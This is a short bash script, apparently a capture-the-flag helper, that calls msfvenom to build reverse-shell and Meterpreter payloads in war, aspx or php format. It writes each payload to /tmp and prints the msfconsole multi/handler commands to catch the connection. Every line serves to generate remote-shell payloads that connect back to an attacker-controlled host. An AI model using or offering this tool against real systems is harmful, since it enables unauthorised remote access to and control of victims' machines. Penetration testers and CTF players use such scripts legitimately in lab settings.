#!/bin/bash
function usage
{
  echo Usage: payload payload_type reverse/meterpreter lport
  echo "Generates common msfvenon payloads for reverse and meterpreter shells"
  echo payload_type is war/aspx/php/exe
}
function meterpreter_commands
{
cat <<-EOF
# setup meterpreter in msfconsole:


use exploit/multi/handler
set $PAYLOAD
set lhost $LHOST
set lport $1
run


EOF
}

source ctfenv.sh
if [ "$3" == "" ]; then
	usage
	exit 1
fi


case "$2" in 
  "reverse")
	case "$1" in
	  "war")
		 PAYLOAD=java/jsp_shell_reverse_tcp
		 FORMAT=war
         ;;
	  "aspx")
		 PAYLOAD=windows/shell/reverse_tcp
		 FORMAT=aspx
         ;;
	  "php")
		 PAYLOAD=php/reverse_php
		 FORMAT=php
         ;;
      "*")
         usage
         exit 1
         ;;
     esac
     ;;
   "meterpreter")
	case "$1" in
	  "war")
		 PAYLOAD=java/meterpreter/reverse_tcp
		 FORMAT=war
         ;;
	  "aspx")
		 PAYLOAD=windows/meterpreter/reverse_tcp
		 FORMAT=aspx
         ;;
	  "php")
		 PAYLOAD=php/meterpreter/reverse_tcp
		 FORMAT=php
         ;;
      "*")
         usage
         exit 1
         ;;
     esac
     meterpreter_commands $3
     ;;
esac
echo
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$3 -f $FORMAT > /tmp/payload.$FORMAT
echo payload /tmp/payload.$FORMAT created.
echo
echo msfvenom command:
echo msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$3 -f $FORMAT

